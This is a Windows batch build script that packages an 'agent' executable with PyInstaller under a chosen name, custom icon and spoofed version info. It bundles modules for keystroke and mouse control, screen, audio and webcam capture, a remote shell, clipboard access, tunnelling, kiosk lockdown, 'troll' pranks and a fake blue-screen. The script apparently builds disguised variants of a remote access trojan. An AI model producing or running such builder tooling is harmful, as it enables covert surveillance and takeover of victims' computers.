@echo off
setlocal
cd /d "%~dp0.."

:: Argument Parsing
:: %1 = Base Name (e.g. WorkAgent)
:: %2 = Icon Path (optional)
:: %3 = Version File (optional)

if "%~1"=="" (
    echo [!] Usage: build_variant.bat Name [IconPath] [VersionInfo]
    exit /b 1
)

set BASE_NAME=%~1
set AGENT_NAME=%BASE_NAME%
set SETUP_NAME=%BASE_NAME%_Installer
:: Viewer implies standard viewer usually, but we can prefix it
set VIEWER_NAME=%BASE_NAME%_Viewer

echo ==========================================
echo    BUILDING VARIANT: %BASE_NAME%
echo ==========================================

:: Icon Setup
set ICON_FLAG=
if not "%~2"=="" (
    if exist "%~2" (
        echo [+] Icon: %~2
        set ICON_FLAG=--icon="%~2"
    ) else (
        echo [-] Icon not found: %~2
    )
)

:: Version Info Setup
set VERSION_FLAG=
if not "%~3"=="" (
    if exist "%~3" (
        echo [+] Version Info: %~3
        set VERSION_FLAG=--version-file="%~3"
    ) else (
        echo [-] Version info not found: %~3
    )
)

:: Build AGENT
echo [*] Building Agent: %AGENT_NAME%.exe...
python -m PyInstaller --console --onefile --noupx --name %AGENT_NAME% %ICON_FLAG% %VERSION_FLAG% ^
    --exclude-module matplotlib ^
    --exclude-module pandas ^
    --exclude-module scipy ^
    --exclude-module PyQt6 ^
    --exclude-module torch ^
    --exclude-module streamlit ^
    --exclude-module altair ^
    --exclude-module flask ^
    --exclude-module selenium ^
    --exclude-module sklearn ^
    --exclude-module pyarrow ^
    --exclude-module ipython ^
    --exclude-module jupyter ^
    --exclude-module chess ^
    --exclude-module google ^
    --exclude-module pywinauto ^
    --exclude-module uiautomation ^
    --exclude-module nodriver ^
    --hidden-import=target.input_controller ^
    --hidden-import=target.privacy ^
    --hidden-import=target.capture ^
    --hidden-import=target.audio ^
    --hidden-import=target.webcam ^
    --hidden-import=target.auditor ^
    --hidden-import=target.shell_handler ^
    --hidden-import=target.process_manager ^
    --hidden-import=target.file_manager ^
    --hidden-import=target.clipboard_handler ^
    --hidden-import=target.device_settings ^
    --hidden-import=target.troll_handler ^
    --hidden-import=target.troll_video_player ^
    --hidden-import=target.bsod_screen ^
    --hidden-import=pynput.keyboard._win32 ^
    --hidden-import=pynput.mouse._win32 ^
    --hidden-import=numpy ^
    --hidden-import=msgpack ^
    --hidden-import=PIL.Image ^
    --hidden-import=cv2 ^
    --hidden-import=requests ^
    --hidden-import=psutil ^
    --hidden-import=target.tunnel_manager ^
    --hidden-import=target.kiosk ^
    --hidden-import=pillow_jxl ^
    --hidden-import=zstandard ^
    --add-data "target;target" ^
    agent_loader.py

if %errorlevel% neq 0 (
    echo [!] Failed to build Agent: %BASE_NAME%
    exit /b 1
)

:: Skipping Setup Build as requested
:: (Add it back here if you ever need installers for these variants)

echo [V] Variant Complete: dist\%AGENT_NAME%.exe
echo.
